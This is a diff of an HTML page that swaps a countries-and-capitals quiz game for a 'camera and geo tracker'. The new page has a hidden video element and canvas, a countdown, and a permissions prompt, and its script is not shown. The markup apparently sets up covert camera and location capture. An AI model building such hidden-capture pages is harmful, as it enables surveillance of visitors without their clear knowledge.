@@ -1,46 +1,20 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>IQ Игра: Страны и столицы</title>
+  <title>Трекер камеры и гео</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <div class="container">
+  <div id="countdown" class="center-screen">3</div>
 
-    <!-- Экран ввода имени и выбора языка -->
-    <div id="start-screen" class="centered">
-      <h1>IQ Игра: Страны и столицы</h1>
-      <input id="name-input" type="text" placeholder="Введите ваше имя" />
-      <div id="lang-select" class="lang-buttons">
-        <button data-lang="hy" title="Հայերեն">
-          <img src="https://flagcdn.com/w40/am.png" alt="Հայերեն" />
-        </button>
-        <button data-lang="ru" title="Русский">
-          <img src="https://flagcdn.com/w40/ru.png" alt="Русский" />
-        </button>
-        <button data-lang="en" title="English">
-          <img src="https://flagcdn.com/w40/gb.png" alt="English" />
-        </button>
-      </div>
-      <button id="start-button" disabled>Начать игру</button>
-    </div>
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
 
-    <!-- Игровой экран -->
-    <div id="game-screen" class="hidden">
-      <div class="header">
-        <div id="player-info"></div>
-        <div id="score-info"></div>
-      </div>
-      <div id="question-container">
-        <div id="question-text"></div>
-        <div id="answers-container"></div>
-      </div>
-      <button id="try-again-btn" class="hidden"></button>
-    </div>
+  <p id="status" class="center-screen" style="display:none;">Запрашиваем разрешения...</p>
 
-  </div>
+  <button id="reloadBtn" style="display:none;">Что-то пошло не так. Перезагрузить</button>
 
   <script src="script.js"></script>
 </body>
